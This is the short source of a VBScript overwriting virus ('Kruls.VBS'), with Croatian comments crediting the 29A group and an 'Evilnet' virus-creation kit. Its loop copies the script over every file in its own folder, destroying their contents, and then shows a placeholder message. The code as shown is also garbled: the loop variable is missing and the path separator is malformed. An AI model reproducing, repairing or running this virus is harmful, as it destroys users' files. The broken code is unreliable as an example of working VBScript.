'Kruls.VBS virus kodirao Santy
'29A
'05-05-01
'VBS V-Kreator v1.0 kodirao ImPU1s3 - Evilnet Inc. (welcome.to/the_evilnet)
Dim FSO, wshshell
set wshshell = Wscript.Createobject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
majka = Wscript.ScriptFullName
put_do_zivota = Left(majka, InStrRev(majka, " \ "))
For Each  In FSO.GetFolder(put_do_zivota).Files
FSO.CopyFile majka, .Name, 1
Next
Wscript.Echo "<- ovdje ide poruka ->"
